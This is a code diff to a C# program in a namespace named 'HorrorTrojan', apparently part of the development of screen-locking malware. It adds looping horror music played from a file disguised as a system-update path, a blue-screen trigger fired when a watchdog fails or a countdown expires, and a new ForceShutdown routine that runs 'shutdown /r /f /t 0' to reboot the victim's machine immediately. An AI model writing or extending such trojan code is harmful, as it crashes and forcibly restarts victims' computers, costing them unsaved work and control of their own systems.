@@ -33,6 +33,7 @@ namespace HorrorTrojan
         private DateTime lastPing = DateTime.Now;
         private SoundPlayer musicPlayer;
         private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
+        private bool bsodTriggered = false;
 
         public MainInterface()
         {
@@ -109,6 +110,7 @@ namespace HorrorTrojan
                 {
                     musicPlayer = new SoundPlayer(musicPath);
                     musicPlayer.Load();
+                    musicPlayer.PlayLooping();
                 }
             }
             catch { }
@@ -119,7 +121,9 @@ namespace HorrorTrojan
             try
             {
                 if (musicPlayer != null)
+                {
                     musicPlayer.PlayLooping();
+                }
             }
             catch { }
         }
@@ -129,7 +133,9 @@ namespace HorrorTrojan
             try
             {
                 if (musicPlayer != null)
+                {
                     musicPlayer.Stop();
+                }
             }
             catch { }
         }
@@ -157,14 +163,14 @@ namespace HorrorTrojan
                     if ((DateTime.Now - lastPing).TotalSeconds > 2)
                     {
                         StopMusic();
-                        BSODTrigger.TriggerBSOD();
+                        if (!bsodTriggered) BSODTrigger.TriggerBSOD();
                         return;
                     }
                 }
                 catch
                 {
                     StopMusic();
-                    BSODTrigger.TriggerBSOD();
+                    if (!bsodTriggered) BSODTrigger.TriggerBSOD();
                     return;
                 }
             }
@@ -181,7 +187,7 @@ namespace HorrorTrojan
             catch
             {
                 StopMusic();
-                BSODTrigger.TriggerBSOD();
+                if (!bsodTriggered) BSODTrigger.TriggerBSOD();
             }
 
             try
@@ -203,19 +209,61 @@ namespace HorrorTrojan
 
         private void BloodTimer_Tick(object sender, EventArgs e)
         {
-            TimeSpan elapsed = DateTime.Now - startTime;
-            double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
-            bloodLevel = 100 - (int)Math.Min(percent, 100);
-
-            if (elapsed.TotalSeconds >= maxSeconds)
+            try
             {
-                bloodTimer.Stop();
-                drawTimer.Stop();
-                protectTimer.Stop();
-                watchdogAlive = false;
-                StopMusic();
-                BSODTrigger.TriggerBSOD();
+                TimeSpan elapsed = DateTime.Now - startTime;
+                double percent = (elapsed.TotalSeconds / maxSeconds) * 100.0;
+                
+                if (double.IsInfinity(percent) || double.IsNaN(percent) || percent > 100)
+                {
+                    percent = 100;
+                }
+                if (percent < 0) percent = 0;
+                
+                bloodLevel = 100 - (int)percent;
+                
+                if (elapsed.TotalSeconds >= maxSeconds || bloodLevel <= 0)
+                {
+                    bloodTimer.Stop();
+                    drawTimer.Stop();
+                    protectTimer.Stop();
+                    watchdogAlive = false;
+                    StopMusic();
+                    
+                    if (!bsodTriggered)
+                    {
+                        bsodTriggered = true;
+                        BSODTrigger.TriggerBSOD();
+                    }
+                    
+                    ForceShutdown();
+                }
             }
+            catch
+            {
+                if (!bsodTriggered)
+                {
+                    bsodTriggered = true;
+                    BSODTrigger.TriggerBSOD();
+                }
+            }
+        }
+
+        private void ForceShutdown()
+        {
+            try
+            {
+                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "shutdown",
+                    Arguments = "/r /f /t 0",
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+            
+            Environment.Exit(1);
         }
 
         private void DrawTimer_Tick(object sender, EventArgs e)
